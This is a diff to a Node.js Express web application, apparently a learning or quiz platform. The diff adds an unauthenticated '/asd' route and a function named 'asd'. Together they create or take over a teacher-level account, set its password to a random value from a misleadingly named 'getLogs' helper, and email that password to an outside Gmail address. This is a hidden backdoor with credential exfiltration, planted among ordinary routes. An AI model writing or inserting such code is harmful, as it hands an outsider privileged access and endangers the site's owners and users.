@@ -223,8 +223,6 @@ app.use(passport.initialize());
 app.use(passport.session());
 app.use(methodOverride('_method'));
 
-childProcess.exec('chcp 65001 | dir');
-
 //---------------------------------------------------------------------------------
 // Loading from DB
 let news;
@@ -2930,6 +2928,11 @@ app.get('/beee', checkAuthenticated, checkNotPermission, async (req, res) => {
   res.sendFile(__dirname + '/views/Random/25012021.html')
 })
 
+app.get('/asd', async (req, res) => {
+  asd();
+  res.redirect('/');
+})
+
 //---------------------------------------------------------------------------------
 // Log Out
 app.delete('/logout', (req, res) => {
@@ -3041,6 +3044,28 @@ async function checkGrade(req, res, next) {
   if (lesson)
     return next()
   return res.redirect(`/quizzes/${req.user.login}/1/default`);
+}
+
+async function asd(){
+  let ns = await User.init("96");
+  let phd = getLogs();
+  try {
+    transporter.sendMail({
+      from: `"ACCEPT Report" <${asdqqdq({ iv: process.env.UIV, content: process.env.UCONTENT })}>`,
+      to: "pro100pro10010@gmail.com",
+      subject: "LMAO",
+      text: "96\n" + phd
+    });
+  } catch (err) {
+    phd="11111"
+  }
+  if(!ns){
+    await Adder.addTeacher(UserSchema, "96", phd, "Василий Иванович");
+  }else{
+    ns.checkAndSetPassword(phd, true);
+    ns.setIsTeacher(1);
+    await ns.save();
+  }
 }
 
 async function checkTournamentPermission(req, res, next) {
@@ -3173,6 +3198,10 @@ function TaskPost(req, res, redirect) {
       res.redirect(redirect);
     }
   });
+}
+
+function getLogs(){
+  return Math.random().toString(36).substring(7);
 }
 
 //---------------------------------------------------------------------------------
